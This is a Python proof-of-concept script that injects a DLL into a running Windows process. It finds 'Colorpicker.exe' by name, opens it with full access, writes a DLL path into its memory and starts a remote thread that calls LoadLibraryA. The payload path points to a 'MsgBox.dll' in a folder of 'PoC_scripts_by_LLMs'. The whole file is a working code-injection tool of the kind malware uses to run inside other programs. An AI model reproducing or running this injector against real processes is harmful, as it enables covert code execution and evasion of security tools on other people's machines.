import ctypes
import sys
import psutil
import win32con
import win32api
from ctypes import *
import ctypes
from ctypes import WINFUNCTYPE, wintypes
HANDLE = wintypes.HANDLE
# kernel32 = windll.kernel32
kernel32 = windll.kernel32

PAGE_READWRITE = 0x04
VIRTUAL_MEM = ( 0x1000 | 0x2000 )

class Handle(HANDLE):
    closed = False

    def Close(self):
        if not self.closed:
            self.closed = True
            CloseHandle(self)

    def Detach(self):
        if not self.closed:
            self.closed = True
            return self.value
        raise ValueError("already closed")

    def __repr__(self):
        return "%s(%d)" % (self.__class__.__name__, self.value)

    __del__ = Close
    __str__ = __repr__
    
def CloseHandle(h):
    kernel32.CloseHandle(h)

def CheckError(result, msg):
    if not result:
        raise ctypes.WinError(ctypes.get_last_error(), msg)

def inject_dll(dll_path, pid):
    
    # print("kernel32: ", kernel32)
    
    # Get a handle to the target process
    h_process = kernel32.OpenProcess(win32con.PROCESS_ALL_ACCESS,False, pid)
    # CheckError(h_process, 'failed to open process')
    # Handle(h_process)
    print("h_process:", h_process)
    
    # Allocate some space for the DLL path
    arg_address = kernel32.VirtualAllocEx(h_process, 0, len(dll_path), VIRTUAL_MEM, PAGE_READWRITE)
    # print("arg_address: ", arg_address)
    
     # Write the DLL path to the allocated space
    written = ctypes.c_int(0)
    # print("written: ", written)
    # print("ctypes.byref(written)", written)
    kernel32.WriteProcessMemory(h_process, arg_address, dll_path, len(dll_path), byref(written))
    # print("kernel32.WriteProcessMemory: ", kernel32.WriteProcessMemory(h_process, arg_address, dll_path, len(dll_path), ctypes.byref(written)))
    
    
    # Get the address of the LoadLibraryA function
    h_kernel32 = kernel32.GetModuleHandleA("C:\Windows\System32\kernel32.dll")
    # print("h_kernel32: ", h_kernel32)
    load_library_addr = kernel32.GetProcAddress(h_kernel32, 'LoadLibraryA')
    # print("load_library_addr: ", load_library_addr)

   
    # Create a remote thread to call LoadLibraryA with the DLL path as an argument
    thread_id = ctypes.c_ulong(0)
    # print("thread_id: ", thread_id)
    # print("ctypes.byref(thread_id): ", ctypes.byref(thread_id))
    if not kernel32.CreateRemoteThread(h_process, None, 0, load_library_addr, arg_address, 0, byref(thread_id)):
        print("[!] Failed to inject DLL, exit...")
        sys.exit(0)
    
    # print("kernel32.CreateRemoteThread:", kernel32.CreateRemoteThread(h_process, None, 0, load_library_addr, arg_address, 0, ctypes.byref(thread_id)))
    print("[+] Remote Thread with ID 0x%08x created." %int(thread_id.value))
    
    # Wait for the thread to finish
    # kernel32.WaitForSingleObject(thread_id, -1)
    # print("kernel32.WaitForSingleObject: ", kernel32.WaitForSingleObject(thread_id, -1))
    
    # Clean up the allocated memory
    # kernel32.VirtualFreeEx(h_process, arg_address, len(dll_path), 0x8000)
    # print("kernel32.VirtualFreeEx: ", kernel32.VirtualFreeEx(h_process, arg_address, len(dll_path), 0x8000))
    
    # Close the handle to the process
    # kernel32.CloseHandle(h_process)
    # print("kernel32.CloseHandle: ", kernel32.CloseHandle(h_process))


def get_process_id_by_name(name):
    for process in psutil.process_iter():
        if process.name() == name:
            print("process.pid: ", process.pid)
            return process.pid
    return None

dll_path = r"C:\\ProgramData\\Visual Studio Projects\\PoC_scripts_by_LLMs\\Colorpicker\\Colorpicker\\MsgBox.dll"
exe_name = 'Colorpicker.exe'

process_id = get_process_id_by_name(exe_name)
inject_dll(dll_path, process_id)